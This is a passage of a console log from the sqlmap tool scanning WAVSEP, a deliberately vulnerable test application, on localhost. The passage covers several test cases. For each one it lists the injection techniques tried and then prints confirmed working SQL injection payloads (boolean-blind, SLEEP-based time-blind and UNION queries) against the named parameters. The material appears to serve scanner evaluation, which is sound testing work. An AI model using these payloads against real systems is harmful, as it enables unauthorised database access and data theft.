[04:45:35] [INFO] checking if the injection point on GET parameter 'minBalanace' is a false positive
GET parameter 'minBalanace' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 500 HTTP(s) requests:
---
Parameter: minBalanace (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: minBalanace=10000 AND 1459=1459

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: minBalanace=10000 AND (SELECT 9795 FROM (SELECT(SLEEP(5)))xsZh)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:45:35] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[9/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp?msgid=1
do you want to test this URL? [Y/n/q]
> Y
[04:45:35] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case09-InjectionInUpdate-Numeric-CommandInjection-WithDifferent200Responses.jsp?msgid=1'                                                                                                  
[04:45:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=7AA7C0B4CD0...AAC7BA30BA'). Do you want to use those [Y/n] Y
[04:45:35] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:45:35] [INFO] testing if the target URL content is stable
[04:45:36] [INFO] target URL content is stable
[04:45:36] [INFO] testing if GET parameter 'msgid' is dynamic
[04:45:36] [WARNING] GET parameter 'msgid' does not appear to be dynamic
[04:45:36] [WARNING] heuristic (basic) test shows that GET parameter 'msgid' might not be injectable
[04:45:36] [INFO] testing for SQL injection on GET parameter 'msgid'
[04:45:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:45:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:45:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:45:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:45:37] [INFO] GET parameter 'msgid' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[04:45:37] [INFO] testing 'Generic inline queries'
[04:45:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:45:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:45:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:45:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:45:37] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:45:37] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:45:37] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:45:37] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:45:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:37] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:37] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:37] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:45:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:45:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:45:37] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:45:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:45:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:45:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:45:37] [INFO] testing 'MySQL inline queries'
[04:45:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:45:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:45:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:45:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:45:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:45:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:45:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:45:47] [INFO] GET parameter 'msgid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:45:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:45:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:45:47] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:45:47] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:45:47] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:45:47] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:45:48] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:45:48] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:45:48] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:45:48] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:45:48] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:45:48] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:45:48] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:45:48] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:45:49] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:45:49] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:45:49] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:45:49] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:45:50] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:45:50] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:45:50] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:45:50] [INFO] checking if the injection point on GET parameter 'msgid' is a false positive
GET parameter 'msgid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 762 HTTP(s) requests:
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msgid=1 AND 2379=(SELECT (CASE WHEN (2379=2379) THEN 2379 ELSE (SELECT 6223 UNION SELECT 3679) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgid=1 AND (SELECT 8543 FROM (SELECT(SLEEP(5)))EFAF)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:45:50] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[10/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=1
do you want to test this URL? [Y/n/q]
> Y
[04:45:51] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithDifferent200Responses.jsp?orderby=1'                                                                             
[04:45:51] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=87122A0E621...2FCCC07667'). Do you want to use those [Y/n] Y
[04:45:51] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:45:51] [INFO] testing if the target URL content is stable
[04:45:51] [INFO] target URL content is stable
[04:45:51] [INFO] testing if GET parameter 'orderby' is dynamic
[04:45:51] [INFO] GET parameter 'orderby' appears to be dynamic
[04:45:51] [INFO] heuristic (basic) test shows that GET parameter 'orderby' might be injectable
[04:45:51] [INFO] testing for SQL injection on GET parameter 'orderby'
[04:45:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:45:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:45:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:45:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:45:54] [INFO] GET parameter 'orderby' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --string="web")
[04:45:54] [INFO] testing 'Generic inline queries'
[04:45:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:45:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:45:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:45:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:45:54] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:45:54] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:45:54] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:45:54] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:45:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:54] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:45:54] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:45:54] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:54] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:45:54] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:45:54] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:45:54] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:45:54] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:45:54] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:45:54] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:45:54] [INFO] testing 'MySQL inline queries'
[04:45:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:45:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:45:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:45:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:45:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:45:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:45:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:46:04] [INFO] GET parameter 'orderby' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:46:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:46:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:46:04] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:46:05] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:46:05] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:46:05] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:46:05] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:46:05] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:46:05] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:46:06] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:46:06] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:46:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:46:06] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:46:06] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:46:06] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:46:06] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:46:07] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:46:07] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:46:07] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:46:07] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:46:07] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:46:07] [INFO] checking if the injection point on GET parameter 'orderby' is a false positive
GET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 762 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: orderby=1 AND 9776=(SELECT (CASE WHEN (9776=9776) THEN 9776 ELSE (SELECT 5972 UNION SELECT 8412) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderby=1 AND (SELECT 7740 FROM (SELECT(SLEEP(5)))vSQG)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:46:08] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[11/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:46:08] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case11-InjectionInView-Date-PermissionBypass-WithDifferent200Responses.jsp?transactionDate=2010-01-01'                                                                                    
[04:46:08] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=D0EA3263934...9E861D06F0'). Do you want to use those [Y/n] Y
[04:46:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:46:08] [INFO] testing if the target URL content is stable
[04:46:08] [INFO] target URL content is stable
[04:46:08] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:46:08] [INFO] GET parameter 'transactionDate' appears to be dynamic
[04:46:08] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:46:08] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:46:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:46:09] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="132")
[04:46:09] [INFO] testing 'Generic inline queries'
[04:46:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:46:09] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:46:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:46:09] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:46:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:46:09] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:46:09] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:46:09] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:46:09] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:09] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:09] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:09] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:09] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:46:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:46:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:46:09] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:46:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:46:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:46:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:46:09] [INFO] testing 'MySQL inline queries'
[04:46:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:46:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:46:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:46:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:46:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:46:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:46:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:46:19] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:46:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:46:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:46:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:46:19] [INFO] target URL appears to have 4 columns in query
[04:46:19] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: transactionDate=2010-01-01' AND 8030=8030 AND 'EFFC'='EFFC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 7836 FROM (SELECT(SLEEP(5)))Xsow) AND 'COiL'='COiL

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-01-01' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6b71,0x4e736f51664164727a47737152724b677977456f72534a794b5764506b5a664b45676374506e5a66,0x71786a6271),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:46:19] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[12/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp?transactionDate=2010-01-01
do you want to test this URL? [Y/n/q]
> Y
[04:46:19] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case12-InjectionInSearch-Date-UnionExploit-WithDifferent200Responses.jsp?transactionDate=2010-01-01'                                                                                      
[04:46:19] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=2C4D1B514A0...78E2D5C9B2'). Do you want to use those [Y/n] Y
[04:46:19] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:46:19] [INFO] testing if the target URL content is stable
[04:46:20] [INFO] target URL content is stable
[04:46:20] [INFO] testing if GET parameter 'transactionDate' is dynamic
[04:46:20] [INFO] GET parameter 'transactionDate' appears to be dynamic
[04:46:20] [WARNING] heuristic (basic) test shows that GET parameter 'transactionDate' might not be injectable
[04:46:20] [INFO] testing for SQL injection on GET parameter 'transactionDate'
[04:46:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:46:20] [INFO] GET parameter 'transactionDate' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="132")
[04:46:20] [INFO] testing 'Generic inline queries'
[04:46:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:46:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:46:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:46:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:46:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:46:20] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:46:20] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:46:20] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:46:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:20] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:46:20] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:46:20] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:46:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:46:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:46:20] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:46:20] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:46:20] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:46:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:46:20] [INFO] testing 'MySQL inline queries'
[04:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:46:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:46:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:46:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:46:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:46:30] [INFO] GET parameter 'transactionDate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:46:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:46:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:46:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:46:30] [INFO] target URL appears to have 4 columns in query
[04:46:31] [INFO] GET parameter 'transactionDate' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionDate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: transactionDate (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: transactionDate=2010-01-01' AND 3573=3573-- LZfO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionDate=2010-01-01' AND (SELECT 7675 FROM (SELECT(SLEEP(5)))RgWe)-- Rpld

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionDate=2010-01-01' UNION ALL SELECT NULL,NULL,CONCAT(0x7176707a71,0x64784f75584e774c585354695a474661656a6b4c544164615a4a6578627744766f6366646174586b,0x71627a7171),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:46:31] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[13/68] URL:
